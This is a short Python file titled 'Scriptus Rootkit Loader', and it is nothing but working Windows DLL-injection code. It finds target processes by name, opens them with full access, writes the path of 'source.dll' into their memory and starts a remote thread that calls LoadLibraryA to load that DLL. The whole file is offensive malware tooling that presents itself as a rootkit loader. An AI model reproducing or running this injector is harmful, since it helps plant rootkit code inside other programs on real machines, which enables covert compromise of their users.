### Scriptus Rootkit Loader
### Injector Version: 0.0.1


import ctypes
import pathlib as path
import sys
from ctypes import wintypes
import psutil



dll_path = path.Path(__file__).parent / "source.dll"
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFFF)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04


def name_to_pid(process_name):
    pids = []
    
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                pids.append(proc.info['pid'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    return pids
    

def inject_dll(pid, dll_path):
    dll_path_bytes = str(dll_path).encode('utf-8')
    dll_len = len(dll_path_bytes) + 1

    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise ctypes.WinError(ctypes.get_last_error())

    arg_address = kernel32.VirtualAllocEx(h_process, None, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not arg_address:
        raise ctypes.WinError(ctypes.get_last_error())

    written = wintypes.SIZE_T(0)
    if not kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes, dll_len, ctypes.byref(written)):
        raise ctypes.WinError(ctypes.get_last_error())

    h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
    load_library_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    thread_id = wintypes.DWORD(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, arg_address, 0, ctypes.byref(thread_id)):
        raise ctypes.WinError(ctypes.get_last_error())
    
